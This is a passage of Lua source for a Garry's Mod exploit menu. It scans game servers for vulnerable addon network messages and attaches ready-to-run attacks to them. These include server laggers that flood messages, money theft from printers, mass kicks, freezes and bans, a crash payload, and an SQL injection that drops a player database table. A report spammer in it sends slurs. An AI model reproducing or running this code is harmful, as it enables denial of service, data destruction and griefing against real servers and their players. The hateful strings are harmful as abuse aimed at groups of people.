	        end
	    end)
	end

	status = ValidNetString("withdrawMoney")

	if (status) then
	    ECPrint("Found Exploit: Lagger #16 [withdrawMoney]")

	    addExploit("92", "Lagger #16", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger16", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("withdrawMoney", true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("SyncPrinterButtons76561198027292625")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #4 [SyncPrinterButtons76561198027292625]")

	    addExploit("93", "Steal All Monies #4", "withdraw money from all printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("SyncPrinterButtons76561198027292625")
	            net.WriteEntity(v)
	            net.WriteUInt(2, 4)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("gPrinters.retrieveMoney")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #5 [gPrinters.retrieveMoney]")

	    addExploit("94", "Steal All Monies #5", "withdraw money from all printers, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("gPrinters.retrieveMoney")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("gPrinters.retrieveMoney")

	if (status) then
	    ECPrint("Found Exploit: Lagger #17 [gPrinters.retrieveMoney]")

	    addExploit("95", "Lagger #17", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger17", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("gPrinters.retrieveMoney", true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("NGII_TakeMoney")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #6 [NGII_TakeMoney]")

	    addExploit("96", "Steal All Monies #6", "withdraw money from all printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("NGII_TakeMoney")
	            net.WriteEntity(v)
	            net.WriteEntity(LocalPlayer())
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("money_clicker_withdraw")

	if (status) then
	    ECPrint("Found Exploit: Lagger #18 [money_clicker_withdraw]")

	    addExploit("97", "Lagger #18", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger18", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("money_clicker_withdraw", true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("opr_withdraw")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #7 [opr_withdraw]")

	    addExploit("98", "Steal All Monies #7", "withdraw money from all printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("opr_withdraw")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("NET_DoPrinterAction")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #8 [NET_DoPrinterAction]")

	    addExploit("99", "Steal All Monies #8", "withdraw money from all printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass():find("print") then
	                net.Start("NET_DoPrinterAction")
	                net.WriteEntity(LocalPlayer())
	                net.WriteEntity(v)
	                net.WriteInt(2, 16)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("tickbooksendfine")

	if (status) then
	    ECPrint("Found Exploit: Ticket Book [tickbooksendfine]")

	    addExploit("100", "Ticket Book", "allows you to write a fine to all players, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        local reasonstable = {"NICE EXPLOIT, RIGHT? discord.gg/2cG6Mcp"}

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("tickbooksendfine")
	                net.WriteString(v:SteamID())
	                net.WriteTable(reasonstable)
	                net.WriteDouble(3000, 32)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("SyncPrinterButtons16690")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #9 [SyncPrinterButtons16690]")

	    addExploit("101", "Steal All Monies #9", "withdraw money from all printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
	                net.Start("SyncPrinterButtons16690")
	                net.WriteEntity(v)
	                net.WriteUInt(2, 4)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("withdrawp")

	if (status) then
	    ECPrint("Found Exploit: Steal All Monies #10 [withdrawp]")

	    addExploit("102", "Steal All Monies #10", "withdraw money from all printers", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.FindByClass("derma_printer")) do
	            net.Start("withdrawp")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("withdrawp")

	if (status) then
	    ECPrint("Found Exploit: Lagger #19 [withdrawp]")

	    addExploit("103", "Lagger #19", "discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        timer.Create("lagger19", 0, 0, function()
	            for i = 1, 1000 do
	                net.Start("withdrawp", true)
	                net.WriteEntity(LocalPlayer())
	                net.SendToServer()
	            end
	        end)
	    end)
	end

	status = ValidNetString("DarkRP_SS_Gamble")

	if (status) then
	    ECPrint("Found Exploit: Free Money #3 [DarkRP_SS_Gamble]")

	    addExploit("104", "Free Money #3", "an exploit in the addon 'DarkRP Casino'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("DarkRP_SS_Gamble")
	        net.WriteInt(99999, 32)
	        net.WriteInt(1, 32)
	        net.WriteInt(0, 32)
	        net.WriteInt(0, 32)
	        net.WriteInt(1, 32)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("PCAdd")

	if (status) then
	    ECPrint("Found Exploit: Delete Promocode [PCAdd]")

	    addExploit("105", "Delete Promocode", "delete all promocodes", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("PCAdd")
	        net.WriteString("alahman")
	        net.WriteString("300000000")
	        net.SendToServer()

	        timer.Simple(3, function()
	            net.Start("ActivatePC")
	            net.WriteString("alahman")
	            net.SendToServer()
	            net.Start("PCDelAll")
	            net.SendToServer()
	        end)
	    end)
	end

	status = ValidNetString("viv_hl2rp_disp_message")

	if (status) then
	    ECPrint("Found Exploit: HL2 Disp Message [viv_hl2rp_disp_message]")

	    addExploit("106", "HL2 Disp Message", "hl2 voice commands", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for name, command in pairs(dispatchCommands) do
	            net.Start("viv_hl2rp_disp_message")
	            net.WriteString(command)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("Kun_SellDrug")

	if (status) then
	    ECPrint("Found Exploit: Free Money #4 [Kun_SellDrug]")

	    addExploit("107", "Free Money #4", "get monies", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("freemoney4") then
	            ECNotify("Starting")

	            timer.Create("freemoney4", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("Kun_SellDrug")
	                    net.WriteString("mushroom")
	                    net.SendToServer()
	                end
	            end)
	        else
	            timer.Remove("freemoney4")
	            ECNotify("Stopping")
	        end
	    end)
	end

	status = ValidNetString("net_PSUnBoxServer")

	if (status) then
	    ECPrint("Found Exploit: Point Shop Unbox [net_PSUnBoxServer]")

	    addExploit("108", "Point Shop Unbox", "an exploit in the addon 'Point Shop", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            local i = 0

	            for k2, v2 in pairs(PS.Items) do
	                if not v:PS_HasItem(v2.ID) then
	                    timer.Simple(k * i * 1.7, function()
	                        net.Start("net_PSUnBoxServer")
	                        net.WriteEntity(v)
	                        net.WriteString(v2.ID)
	                        net.SendToServer()
	                    end)

	                    i = i + 1
	                end
	            end
	        end
	    end)
	end

	status = ValidNetString("pplay_sendtable")

	if (status) then
	    ECPrint("Found Exploit: вў Fuck the SQL database вў [pplay_sendtable]")

	    addExploit("109", "вў Fuck the SQL database вў", "fuck all", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        local tbl = {}
	        tbl.tblname = "darkrp_door; DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)"
	        tbl.ply = LocalPlayer()
	        net.Start("pplay_sendtable")
	        net.WriteTable(tbl)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("75_plus_win")

	if (status) then
	    ECPrint("Found Exploit: Free Money #5 [75_plus_win]")

	    addExploit("110", "Free Money #5", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("75_plus_win")
	        net.WriteString("99999999")
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ATMDepositMoney")

	if (status) then
	    ECPrint("Found Exploit: Free Money #6 [ATMDepositMoney]")

	    addExploit("111", "Free Money #6", "an exploit in 'ATM'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ATMDepositMoney")
	        net.WriteFloat(-9999999)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("SellMinerals")

	if (status) then
	    ECPrint("Found Exploit: Free Money #7 [SellMinerals]")

	    addExploit("112", "Free Money #7", "an exploit in 'eMining'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(SkillDB) do
	            if not (v.iSkill == true) then
	                net.Start("Upgrade")

	                net.WriteTable({
	                    LuaName = v.LuaName,
	                    Amount = -9999999
	                })

	                net.SendToServer()
	                net.Start("SellMinerals")

	                net.WriteTable({
	                    Target = LocalPlayer()
	                })

	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("TakeBetMoney")

	if (status) then
	    ECPrint("Found Exploit: Free Money #8 [TakeBetMoney]")

	    addExploit("113", "Free Money #8", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("TakeBetMoney")
	        net.WriteTable({1e333333, 1e333333})
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("Kun_SellOil")

	if (status) then
	    ECPrint("Found Exploit: Free Money #9 [Kun_SellOil]")

	    addExploit("114", "Free Money #9", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            net.Start("Kun_SellOil")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end


	status = ValidNetString("DepositMoney")

	if (status) then
	    ECPrint("Found Exploit: Free Money #10 [DepositMoney]")

	    addExploit("115", "Free Money #10", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("DepositMoney")

	        for k, v in pairs(ents.GetAll()) do
	            net.WriteEntity(v)
	            net.WriteString(-100000000)
	            net.WriteEntity(LocalPlayer())
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("NET_SS_DoBuyTakeoff")

	if (status) then
	    ECPrint("Found Exploit: Free Money #11 [NET_SS_DoBuyTakeoff]")

	    addExploit("116", "Free Money #11", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("NET_SS_DoBuyTakeoff", true)
	        net.WriteEntity(LocalPlayer())
	        net.WriteEntity(table.Random(player.GetAll()))
	        net.WriteTable({})
	        net.WriteInt(-1000000000000000000000000000000000000000000000000000000000000000000, 16)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("NET_EcSetTax")

	if (status) then
	    ECPrint("Found Exploit: Free Money #12 [NET_EcSetTax]")

	    addExploit("117", "Free Money #12", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("NET_EcSetTax")
	        net.WriteInt(-9999999999, 16)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("RP_Accept_Fine")

	if (status) then
	    ECPrint("Found Exploit: Free Money #13 [RP_Accept_Fine]")

	    addExploit("118", "Free Money #13", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("RP_Accept_Fine")
	            net.WriteString(v:Nick())
	            net.WriteDouble(-999999999999)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("drugseffect_remove")

	if (status) then
	    ECPrint("Found Exploit: Remove Weapons [drugseffect_remove]")

	    addExploit("119", "Remove Weapons", "remove all weapons", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugseffect_remove")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugs_money")

	if (status) then
	    ECPrint("Found Exploit: Remove Money [drugs_money]")

	    addExploit("120", "Remove Money", "remove all money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugs_money")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("CRAFTINGMOD_SHOP")

	if (status) then
	    ECPrint("Found Exploit: Free Money #14 [CRAFTINGMOD_SHOP]")

	    addExploit("121", "Free Money #14", "an exploit in 'crafting mod'", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("CRAFTINGMOD_SHOP")

	        net.WriteTable({
	            BUY = -9999999,
	            type = 1
	        })

	        net.WriteInt(1, 16)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugs_ignite")

	if (status) then
	    ECPrint("Found Exploit: Fire Players [drugs_ignite]")

	    addExploit("122", "Fire Players", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugs_ignite")
	        net.WriteString("player")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugs_ignite")

	if (status) then
	    ECPrint("Found Exploit: Fire Props [drugs_ignite]")

	    addExploit("123", "Fire Props", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugs_ignite")
	        net.WriteString("prop_physics")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugseffect_hpremove")

	if (status) then
	    ECPrint("Found Exploit: Change HP [drugseffect_hpremove]")

	    addExploit("124", "Change HP", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugseffect_hpremove")
	        net.WriteString(99999)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugs_text")

	if (status) then
	    ECPrint("Found Exploit: Delete All Props #2 [drugs_text]")

	    addExploit("125", "Delete All Props #2", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugs_text")
	        net.WriteString("prop_physics")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugs_give")

	if (status) then
	    ECPrint("Found Exploit: Give Everyone RPG [drugs_give]")

	    addExploit("126", "Give Everyone RPG", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugs_give")
	        net.WriteString("weapon_rpg")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugs_text")

	if (status) then
	    ECPrint("Found Exploit: Remove Water [drugs_text]")

	    addExploit("127", "Remove Water", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugs_text")
	        net.WriteString("func_water_analog")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("drugs_effect")

	if (status) then
	    local eye = LocalPlayer():GetEyeTrace().Entity
	    local send = "del|" .. eye:EntIndex()
	    ECPrint("Found Exploit: Remove looking at [drugs_effect]")

	    addExploit("128", "Remove looking at", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("drugs_effect")
	        net.WriteString(send)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("RecKickAFKer")

	if (status) then
	    ECPrint("Found Exploit: Kick Everyone #2 [RecKickAFKer]")

	    addExploit("129", "Kick Everyone #2", "kick all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("RecKickAFKer")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("GMBG:PickupItem")

	if (status) then
	    ECPrint("Found Exploit: Loot Items [GMBG:PickupItem]")

	    addExploit("130", "Loot Items", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(ents.GetAll()) do
	            if v:GetClass() == "item_loot" then
	                net.Start("GMBG:PickupItem")
	                net.WriteEntity(v)
	                net.SendToServer()
	                net.Start("GMBG:PickupItem")
	                net.WriteEntity(v)
	                net.SendToServer()
	                net.Start("GMBG:PickupItem")
	                net.WriteEntity(v)
	                net.SendToServer()
	                net.Start("GMBG:PickupItem")
	                net.WriteEntity(v)
	                net.SendToServer()
	                net.Start("GMBG:PickupItem")
	                net.WriteEntity(v)
	                net.SendToServer()
	                net.Start("GMBG:PickupItem")
	                net.WriteEntity(v)
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("plyWarning")

	if (status) then
	    ECPrint("Found Exploit: Kick Everyone #3 [plyWarning]")

	    addExploit("131", "Kick Everyone #3", "kick all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start('plyWarning')
	            net.WriteEntity(v)
	            net.WriteString('You have to select a player before doing a action.')
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("NLR.ActionPlayer")

	if (status) then
	    ECPrint("Found Exploit: Freeze Everyone [NLR.ActionPlayer]")

	    addExploit("132", "Freeze Everyone", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("NLR.ActionPlayer")
	            net.WriteEntity(v)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("kart_sell")

	if (status) then
	    ECPrint("Found Exploit: Free Money #15 [kart_sell]")

	    addExploit("133", "Free Money #15", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for i = 1, 300 do
	            net.Start("kart_sell")
	            net.WriteString("sw_gokart")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("ClickerAddToPoints")

	if (status) then
	    ECPrint("Found Exploit: Free Points [ClickerAddToPoints]")

	    addExploit("134", "Free Points", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ClickerAddToPoints")
	        net.WriteInt(99999999, 32)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("bodyman_model_change")

	if (status) then
	    ECPrint("Found Exploit: Body Groups [bodyman_model_change]")

	    addExploit("135", "Body Groups", "constantly changes your appearance", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        local PM = 1
	        local SK = 1
	        local BG = 1
	        local HN = 1
	        local TS = 1
	        local GL = 1
	        local LG = 1

	        if not timer.Exists("bodygroups") then
	            timer.Create("bodygroups", 0, 0, function()
	                PlayerModels = {0, 1, 2, 3, 4, 5, 6}
	                Torso = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
	                Legs = {0, 1, 2, 3, 4, 5, 6}
	                Hands = {0, 1, 2}
	                Glasses = {0, 1}
	                Skins = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10}
	                PM = PM + 1
	                TS = TS + 1
	                LG = LG + 1
	                HN = HN + 1
	                GL = GL + 1
	                SK = SK + 1

	                if (PM > #PlayerModels) then
	                    PM = 1
	                end

	                if (SK > #Skins) then
	                    SK = 1
	                end

	                if (HN > #Hands) then
	                    HN = 1
	                end

	                if (TS > #Torso) then
	                    TS = 1
	                end

	                if (GL > #Glasses) then
	                    GL = 1
	                end

	                if (LG > #Legs) then
	                    LG = 1
	                end

	                net.Start("bodyman_model_change")
	                net.WriteInt(PlayerModels[PM], 10)
	                net.SendToServer()
	                net.Start("bodygroups_change")
	                net.WriteTable({1, Torso[TS]})
	                net.SendToServer()
	                net.Start("bodygroups_change")
	                net.WriteTable({2, Legs[LG]})
	                net.SendToServer()
	                net.Start("bodygroups_change")
	                net.WriteTable({3, Hands[HN]})
	                net.SendToServer()
	                net.Start("bodygroups_change")
	                net.WriteTable({4, Glasses[GL]})
	                net.SendToServer()
	            end)
	        else
	            timer.Remove("bodygroups")
	            ECNotify("Stopping")
	        end
	    end)
	end

	status = ValidNetString("SendMoney")

	if (status) then
	    ECPrint("Found Exploit: Free Money #16 [SendMoney]")

	    addExploit("136", "Free Money #16", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        hook.Remove("HUDPaint", "skhdsakjl")
	        net.Start("SendMoney")
	        net.WriteEntity(LocalPlayer())
	        net.WriteEntity(LocalPlayer())
	        net.WriteEntity(LocalPlayer())
	        net.WriteString("-99999999")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("BailOut")

	if (status) then
	    ECPrint("Found Exploit: Free Money #17 [BailOut]")

	    addExploit("137", "Free Money #17", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("BailOut")
	            net.WriteEntity(LocalPlayer())
	            net.WriteEntity(v)
	            net.WriteFloat(-999999999)
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("hitcomplete")

	if (status) then
	    ECPrint("Found Exploit: Free Money #18 [hitcomplete]")

	    addExploit("138", "Free Money #18", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("hitcomplete")
	        net.WriteDouble(99999999)
	        net.SendToServer()
	    end)
	end

	----------------------------------------
	for k, v in pairs(player.GetAll()) do
	    dahater = v
	end

	----------------------------------------
	status = ValidNetString("hhh_request")

	if (status) then
	    ECPrint("Found Exploit: Free Money #19 [hhh_request]")

	    addExploit("139", "Free Money #19", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        local plyhhh = LocalPlayer()

	        if dahater ~= plyhhh then
	            local hitRequest = {}
	            hitRequest.hitman = plyhhh
	            hitRequest.requester = plyhhh
	            hitRequest.target = dahater
	            hitRequest.reward = -9999999
	            net.Start('hhh_request')
	            net.WriteTable(hitRequest)
	            net.SendToServer()
	        else
	            ECPrint("In this version of HHH, you can not use an exploit!")
	        end
	    end)
	end

	status = ValidNetString("DaHit")

	if (status) then
	    ECPrint("Found Exploit: Free Money #20 [DaHit]")

	    addExploit("140", "Free Money #20", "get money", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        hook.Remove("HUDPaint", "skhdsakjl")
	        net.Start("DaHit")
	        net.WriteFloat(-99999999)
	        net.WriteEntity(LocalPlayer())
	        net.WriteEntity(LocalPlayer())
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("textstickers_entdata")

	if (status) then
	    ECPrint("Found Exploit: Crash #2 [textstickers_entdata]")

	    addExploit("141", "Crash #2", "1tap", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("textstickers_entdata")
	        net.WriteUInt(0xFFFFFFF, 32)
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("gBan.BanBuffer")

	if (status) then
	    ECPrint("Found Exploit: gBan Everyone [gBan.BanBuffer]")

	    addExploit("142", "gBan Everyone", "exploit in the old version of gban", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            if v ~= LocalPlayer() then
	                net.Start("gBan.BanBuffer")
	                net.WriteBool(true)
	                net.WriteInt(0, 32)
	                net.WriteString("haha owned")
	                net.WriteString(v:SteamID())
	                net.SendToServer()
	            end
	        end
	    end)
	end

	status = ValidNetString("ARMORY_RetrieveWeapon")

	if (status) then
	    ECPrint("Found Exploit: Free Armory #1 [ARMORY_RetrieveWeapon]")

	    addExploit("143", "Free Armory #1", "get weapon #1", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ARMORY_RetrieveWeapon")
	        net.WriteString("weapon1")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ARMORY_RetrieveWeapon")

	if (status) then
	    ECPrint("Found Exploit: Free Armory #2 [ARMORY_RetrieveWeapon]")

	    addExploit("144", "Free Armory #2", "get weapon #2", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ARMORY_RetrieveWeapon")
	        net.WriteString("weapon2")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("ARMORY_RetrieveWeapon")

	if (status) then
	    ECPrint("Found Exploit: Free Armory #3 [ARMORY_RetrieveWeapon]")

	    addExploit("145", "Free Armory #3", "get weapon #3", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("ARMORY_RetrieveWeapon")
	        net.WriteString("weapon3")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("TransferReport")

	if (status) then
	    ECPrint("Found Exploit: Report Spammer [TransferReport]")

	    addExploit("146", "Report Spammer", "report all players", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("TransferReport")
	        net.WriteString(v:SteamID())
	        net.WriteString("CHINKGANG FAGOTS")
	        net.WriteString("DITCH THIS SHITTY SERVER AND BUY R2D2 TODAY")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("FIRE_CreateFireTruck")

	if (status) then
	    ECPrint("Found Exploit: Create Fire Truck [FIRE_CreateFireTruck]")

	    addExploit("147", "Create Fire Truck", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("FIRE_CreateFireTruck")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("TFA_Attachment_RequestAll")

	if (status) then
	    ECPrint("Found Exploit: Lagger #20 [TFA_Attachment_RequestAll]")

	    addExploit("148", "Lagger #20", "an exploit in 'TFA Weapon Pack', discovered by zerg314", function()
	        surface.PlaySound("garrysmod/ui_click.wav")

	        if not timer.Exists("lagger20") then
	            timer.Create("lagger20", 0, 0, function()
	                for i = 1, 800 do
	                    net.Start("TFA_Attachment_RequestAll", true)
	                    net.SendToServer()
	                end
	            end)

	            ECNotify("Starting Lagger")
	        else
	            timer.Remove("lagger20")
	            ECNotify("Stopping Lagger")
	        end
	    end)
	end

	status = ValidNetString("FIRE_RemoveFireTruck")

	if (status) then
	    ECPrint("Found Exploit: Remove Fire Truck [FIRE_RemoveFireTruck]")

	    addExploit("149", "Remove Fire Truck", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("FIRE_RemoveFireTruck")
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("gPrinters.sendID")

	if (status) then
	    ECPrint("Found Exploit: Lagger #21 [gPrinters.sendID]")

	    addExploit("150", "Lagger #21", "B1G LAGZ, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        if not timer.Exists("lagger21") then
	            timer.Create("lagger21", 0, 0, function()
	                for i = 1, 1000 do
	                    net.Start("gPrinters.sendID", true)
	                    net.WriteEntity(LocalPlayer())
	                    net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 8)
	                    net.SendToServer()
	                end
	            end)
	        end
	    end)
	end

	status = ValidNetString("requestmoneyforvk") -- RusElite Server

	if (status) then
	    ECPrint("Found Exploit: Free 50k [requestmoneyforvk]")

	    addExploit("151", "Free 50k", "gives you 50k bypassing the validation check, discovered by Leith", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")
	        net.Start("requestmoneyforvk")
	        net.WriteEntity(LocalPlayer())
	        net.SendToServer()
	    end)
	end

	status = ValidNetString("vj_testentity_runtextsd")

	if (status) then
	    ECPrint("Found Exploit: VJSay [NEW] [vj_testentity_runtextsd]")

	    addExploit("152", "VJSay [NEW]", "'fix' of the old exploit", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("vj_testentity_runtextsd")
	            net.WriteEntity(v)
	            net.WriteString("OWNED OWNED OWNED OWNED OWNED OWNED OWNED OWNED ")
	            net.WriteString("vj_illuminati/Illuminati Confirmed.mp3")
	            net.SendToServer()
	        end
	    end)
	end

	status = ValidNetString("NET_BailPlayer") -- need to test

	if (status) then
	    ECPrint("Found Exploit: Players Spam [NET_BailPlayer]")

	    addExploit("153", "Players Spam", "", function()
	        surface.PlaySound("garrysmod/ui_click.wav")
	        ECNotify("Starting")

	        for k, v in pairs(player.GetAll()) do
	            net.Start("NET_BailPlayer")
	            net.WriteEntity(v)
